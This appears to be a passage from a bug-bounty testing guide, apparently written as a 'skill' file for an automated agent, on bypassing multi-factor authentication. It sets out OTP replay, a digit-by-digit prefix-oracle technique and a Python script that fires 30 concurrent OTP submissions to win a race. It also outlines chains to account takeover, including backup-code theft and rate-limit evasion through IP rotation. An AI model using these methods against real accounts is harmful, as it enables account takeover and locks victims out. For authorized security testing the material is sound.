3. If the response returns user data → MFA is enforced only in the UI, not server-side = Critical

**Pattern 2 — OTP replay (reuse a consumed code):**
1. Complete a valid MFA flow to get a working OTP
2. Log out, log in again with the same credentials
3. Submit the same OTP again
4. If accepted → OTP is not invalidated after use

**Pattern 3 — Submit obviously wrong OTP, observe response:**
Try submitting `000000` or `123456`. If the response is 200 or returns a session token, OTP validation is broken or client-side only.

**Pattern 4 — Partial / incremental validation (prefix oracle):**
If a guessed full code is rejected, test whether the server validates the OTP **prefix-by-prefix** instead of all-or-nothing. Submit a short partial code and compare responses:
1. Submit a 1–3 digit value (e.g. `otp=1`, then `otp=12`, …) — for a POST verify endpoint the code goes in the **request body**, not the URL query string, or the server reads an empty value.
2. If a *correct* prefix gives a DIFFERENT response than a wrong one (a success/flag, a distinct message, or a different length/timing), the validator leaks correctness one chunk at a time.
3. Walk the code digit-by-digit: keep the prefix that "responds correct," append 0–9, repeat. This collapses 10^6 brute force to ~10×N guesses (≤60 for a 6-digit code) — very feasible in a bounded test.
This is the go-to when there is no leaked code and no skip/replay path. Some apps award success on *any* correct prefix outright (so a single correct first digit can win — sweep `otp=0,1,…,9` before giving up).
**CRITICAL — stay in ONE session:** re-authenticating (POST /…/login again) regenerates the OTP, throwing away your prefix progress. Do the entire sweep against a single established MFA session; never re-login between guesses.

**On full brute force:** brute-forcing all 10^6 codes is infeasible in a bounded test — but the prefix oracle above (Pattern 4) usually makes it unnecessary. Only attempt full brute force with evidence of no rate limit AND a small key space.

**Proof:** A session token or protected resource data in the response without completing MFA confirms the bypass.

---

### Pattern 5: Race on MFA Verification
```python
import asyncio, aiohttp

async def verify(session, otp):
    async with session.post("https://target.com/api/mfa/verify",
                            json={"otp": otp}) as r:
        return r.status, await r.text()

async def race():
    cookies = {"session": "YOUR_SESSION"}
    async with aiohttp.ClientSession(cookies=cookies) as s:
        # Fire ~30 concurrent submissions of the SAME OTP to hit the TOCTOU
        # window before the server marks it used. Two requests are NOT enough —
        # they almost always resolve sequentially as "already-used" (false negative).
        # Best done as a single-packet / 20+ HTTP-2-stream attack (Turbo Intruder).
        results = await asyncio.gather(*[verify(s, "123456") for _ in range(30)])
        # Race confirmed if >1 success (or 1 success among many "already-used").
        for status, body in results:
            print(status, body)
asyncio.run(race())
```

## Related Skills & Chains

- **`hunt-ato`** — MFA bypass is a primitive; ATO is the destination. Chain primitive: cookie theft (via XSS or session-fixation) + password oracle (login response timing/length diff reveals valid passwords without lockout) + no MFA step-up on password-change endpoint = persistent ATO without ever facing the OTP challenge → password rotated, attacker locks victim out.
- **`hunt-race-condition`** — Pattern 5 (OTP race) lives in race-condition territory; load both skills together. Chain primitive: same 6-digit OTP submitted via 20 parallel HTTP/2 streams (single-packet Turbo Intruder attack) before the server marks it used → 1 success + 19 "already-used" → race window confirmed → attacker doesn't need to brute, just guesses once and parallelizes → ATO.
- **`hunt-auth-bypass`** — MFA-step-skip is auth-flow bypass at the workflow layer. Chain primitive: pre-MFA cookie issued after password step + direct navigation to `/dashboard` skipping `/mfa` route + server only middleware-gates `/mfa` not `/dashboard` = full post-auth access from password-only state → MFA never enforced because the route gate was misplaced.
- **`hunt-misc`** — Recovery-code dump via `/api/me` is a misc-class info disclosure that becomes Critical when chained. Chain primitive: `/api/me` returns full user object including `backup_codes` array (plaintext, never rotated) → attacker with any read-IDOR or XSS exfils backup codes → uses one backup code → MFA satisfied → ATO without OTP knowledge.
- **`security-arsenal`** — Pull the OTP-brute-force payload section (000000-999999 wordlist generator, ffuf rate-limit-evasion patterns with `-t 5 -p 0.5-2`, distributed-IP rotation via proxychains) and the JWT-token-replay table when "MFA satisfied" claim lives in a JWT claim that can be forged.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an MFA bypass that only works when the attacker already has the password. Standalone MFA bypass is High; chained-with-password-oracle is Critical; chained-with-cookie-theft-only is Critical. The chain question separates the two.
